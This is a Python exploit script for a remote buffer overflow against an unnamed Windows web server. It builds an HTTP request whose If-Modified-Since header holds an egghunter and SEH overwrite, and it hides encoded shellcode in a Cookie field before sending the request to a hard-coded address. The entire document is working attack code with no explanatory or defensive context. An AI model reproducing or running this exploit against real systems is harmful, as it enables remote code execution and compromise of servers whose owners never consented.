#!/usr/bin/python

'''Tested on Windows 7 Enterprise SP1'''

import struct,socket,sys,os

host = '192.168.1.28'
port = 80

# bad characters: "\x00\x0a\x0d"

shellcode = ("W00TW00T"
"\xdd\xc6\xba\x7d\xe2\x0e\x1c\xd9\x74\x24\xf4\x58\x2b\xc9\xb1"
"\x52\x31\x50\x17\x83\xe8\xfc\x03\x2d\xf1\xec\xe9\x31\x1d\x72"
"\x11\xc9\xde\x13\x9b\x2c\xef\x13\xff\x25\x40\xa4\x8b\x6b\x6d"
"\x4f\xd9\x9f\xe6\x3d\xf6\x90\x4f\x8b\x20\x9f\x50\xa0\x11\xbe"
"\xd2\xbb\x45\x60\xea\x73\x98\x61\x2b\x69\x51\x33\xe4\xe5\xc4"
"\xa3\x81\xb0\xd4\x48\xd9\x55\x5d\xad\xaa\x54\x4c\x60\xa0\x0e"
"\x4e\x83\x65\x3b\xc7\x9b\x6a\x06\x91\x10\x58\xfc\x20\xf0\x90"
"\xfd\x8f\x3d\x1d\x0c\xd1\x7a\x9a\xef\xa4\x72\xd8\x92\xbe\x41"
"\xa2\x48\x4a\x51\x04\x1a\xec\xbd\xb4\xcf\x6b\x36\xba\xa4\xf8"
"\x10\xdf\x3b\x2c\x2b\xdb\xb0\xd3\xfb\x6d\x82\xf7\xdf\x36\x50"
"\x99\x46\x93\x37\xa6\x98\x7c\xe7\x02\xd3\x91\xfc\x3e\xbe\xfd"
"\x31\x73\x40\xfe\x5d\x04\x33\xcc\xc2\xbe\xdb\x7c\x8a\x18\x1c"
"\x82\xa1\xdd\xb2\x7d\x4a\x1e\x9b\xb9\x1e\x4e\xb3\x68\x1f\x05"
"\x43\x94\xca\x8a\x13\x3a\xa5\x6a\xc3\xfa\x15\x03\x09\xf5\x4a"
"\x33\x32\xdf\xe2\xde\xc9\x88\xcc\xb7\xd0\x42\xa5\xc5\xd2\x43"
"\x69\x43\x34\x09\x81\x05\xef\xa6\x38\x0c\x7b\x56\xc4\x9a\x06"
"\x58\x4e\x29\xf7\x17\xa7\x44\xeb\xc0\x47\x13\x51\x46\x57\x89"
"\xfd\x04\xca\x56\xfd\x43\xf7\xc0\xaa\x04\xc9\x18\x3e\xb9\x70"
"\xb3\x5c\x40\xe4\xfc\xe4\x9f\xd5\x03\xe5\x52\x61\x20\xf5\xaa"
"\x6a\x6c\xa1\x62\x3d\x3a\x1f\xc5\x97\x8c\xc9\x9f\x44\x47\x9d"
"\x66\xa7\x58\xdb\x66\xe2\x2e\x03\xd6\x5b\x77\x3c\xd7\x0b\x7f"
"\x45\x05\xac\x80\x9c\x8d\xcc\x62\x34\xf8\x64\x3b\xdd\x41\xe9"
"\xbc\x08\x85\x14\x3f\xb8\x76\xe3\x5f\xc9\x73\xaf\xe7\x22\x0e"
"\xa0\x8d\x44\xbd\xc1\x87")

nseh = '\xeb\xde\x90\x90'
seh =  "\x52\x37\x42" # null byte at the end of POP POP RET address.

# egg = W00T
egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a"
"\x74\xef\xb8\x57\x30\x30\x54\x89\xd7\xaf\x75\xea\xaf\x75\xe7"
"\xff\xe7")

payload = 'A' * (188 - len(egghunter))
payload += egghunter
payload += nseh
payload += seh

request = (
"GET / HTTP/1.1\r\n"
"Host: 192.168.1.28\r\n"
"User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\r\n"
"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
"Accept-Language: en-US,en;q=0.5\r\n"
"Connection: close\r\n"
"Cookie: UserID=" + shellcode + "; PassWD=; frmUserName=; frmUserPass=; rememberPass=202%2C197%2C208%2C215%2C201\r\n"
"Upgrade-Insecure-Requests: 1\r\n"
"If-Modified-Since: Fri, " + payload + "\r\n\r\n"
)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((host,port))
sock.send(request)
sock.close()